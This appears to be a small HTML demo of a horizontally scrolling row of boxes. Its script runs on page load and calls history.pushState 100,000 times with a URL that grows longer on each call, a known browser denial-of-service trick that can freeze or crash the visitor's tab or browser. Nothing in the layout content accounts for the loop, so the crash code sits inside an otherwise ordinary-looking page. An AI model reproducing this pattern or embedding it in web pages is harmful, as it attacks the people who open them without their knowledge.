<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width">
  <title>one</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    .wrap {
      width: 100%;
      height: 120px;
      background-color: #999;
      white-space: nowrap;
      overflow: scroll;
    }
    .item {
      display: inline-block;
      width: 40%;
      height: 100px;
    }
    .item {
      border: 1px solid red;
    }
  </style>

</head>
<body>
  <div class="wrap"><div class="item"></div><div class="item"></div><div class="item"></div><div class="item"></div><div class="item"></div></div>
  <script>
    var a = "";
    for (var i = 0; i < 100000; i++){
      a += i.toString();
      history.pushState(0,0,a);
    }
  </script>
</body>
</html>